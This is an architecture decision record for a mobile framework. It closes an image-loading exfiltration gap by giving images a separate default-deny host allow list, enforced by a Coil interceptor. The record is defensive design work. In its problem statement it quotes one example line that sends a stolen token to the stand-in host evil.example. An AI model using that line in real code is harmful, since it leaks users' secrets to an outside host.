# ADR-034: Images Are a Network Channel

**Date:** 2026-09-03
**Status:** Accepted

## 1. Context & Problem Statement

`DogwoodNetwork` is a policy point, and deliberately a strict one. It default-denies, opts into
cleartext per host, caps bodies against both the declared length and what actually arrives, and —
since [the platform review](../../plans/platform-review.md) — re-checks the rule on every redirect.
All of that exists for one stated reason: the payload is downloaded and replaceable over the air
without a store review, so an open network service would be an exfiltration channel with the
application's name on it.

**None of it applied to images.** `AsyncImage(url)` handed a guest-supplied string to Coil, and
Coil fetched it with the singleton loader and no rule whatsoever:

```kotlin
AsyncImage(url = "https://evil.example/collect?token=" + stolen)
```

The image never has to load. **Making the request is the leak**, and the response is not even
interesting. This was true on Android from the moment images landed, and Phase 6 extended it to iOS
without comment — a second, unpoliced network channel sitting beside a heavily policed one.

The adversarial review found it and correctly declined to call it a defect to patch: it needs a
decision first, because images and data do not want the same list.

## 2. Decision

**Images get their own allow rule, defaulting to refusing everything, enforced by a Coil interceptor
that short-circuits before any connection is opened.**

1. `allowImageHosts(vararg hosts, allowCleartextHosts)` — the same shape as `allowHosts`, so a host
   configuring both does not learn two idioms.
2. `ImagePolicyInterceptor` refuses by returning an `ErrorResult` **without calling `proceed()`**.
3. `ImageLoader.Builder.withDogwoodImagePolicy(allow, onRefused)` is the seam a host installs.
4. Refusals land in `SkewReport.refusedImages`.

## 3. Rationale & Research

### Why a separate list rather than reusing the data one

The threat is identical — a guest-chosen URL reaching a guest-chosen host — which is the argument
for one list. The *legitimate traffic* is not identical, which is the argument that wins.

Product images usually live on a content delivery network that has no business answering data
requests. Forcing one list would push a host to add its image CDN to the rule governing
`DogwoodNetwork.fetch`, which widens the data policy to accommodate pictures and quietly grants the
guest a fetchable origin it never needed. Two lists let a host say "this CDN serves images and
nothing else", which is the sentence they actually mean.

The image list **defaults to refusing everything**, matching `DogwoodNetwork`. A host that
configures nothing inherits default-deny rather than an accidental hole.

### Why an interceptor rather than a check at the call site

`AsyncImage` is one of several ways a request reaches Coil, and a rule enforced per call site is a
rule somebody adds a call site around. The interceptor sits under all of them, and short-circuits
the chain — so a refused request opens no connection, rather than opening one whose result is
discarded.

### The scheme is constrained, before it could bite

`allowImageHosts` requires `https`, or `http` for a host explicitly named for cleartext. That is the
lesson from the iOS network review applied preemptively: a rule that merely waives "must be HTTPS"
lets `file:` and `data:` through on any loader that serves them, and iOS's did. Getting it right here
cost one line; getting it wrong there made the application container readable through the network
policy.

### Verification

Seven tests on the decision itself, including the control (an allowed host proceeds — without it, a
rule that refused everything would pass every other assertion), host-supplied models being exempt
because they never crossed the boundary, and the scheme cases above.

The tests exercise `imageVerdict` rather than a faked `Interceptor.Chain`. Faking Coil's
`ImageRequest`, `Image` and `Chain` convincingly buys coverage of Coil's types rather than of this
rule, and it was tried and abandoned — the same trade recorded in
[ADR-033](ADR-033-the-ios-host-profile.md) for the `NSURLSession` delegate.

**What that leaves is whether the interceptor is actually installed and reached**, which no unit test
can show. Verified on device: with `images.unsplash.com` removed from the sample's list, the running
application logged three refusals for that host and the screen still rendered; with it restored,
zero refusals and images load. That is the assertion the unit tests cannot make.

## 4. Unstated Assumptions

- **A host that installs no loader has no policy.** Enforcing it would mean owning the application's
  image stack, which Dogwood has no business doing. What Dogwood owes is that the seam exists, that
  the default refuses, and that the samples show it wired — not that every consumer is prevented from
  opting out.
- **Refusal is a blank space, not an error state.** `AsyncImage` has no placeholder or error slot yet
  (a known gap since Phase 4), so a refused image looks like a slow one. `SkewReport.refusedImages`
  is what makes it diagnosable meanwhile.
- **Coil's own caching may serve a previously-allowed image after the rule narrows.** The interceptor
  runs per request, not per cache entry; a host tightening its list should clear the image cache.
- **iOS and desktop are unwired.** The seam is common code and the rule is common; only the samples'
  installation is per-platform, and only Android's is done.

## 5. Updated Documents

- [Layer 5: The Native Host & Generated Binding Layer](../../specs/layer-5-host.md) — the host
  service surface's network policy now names images as a second channel.
- [Platform review plan](../../plans/platform-review.md) — Part 2's first investigation, closed.
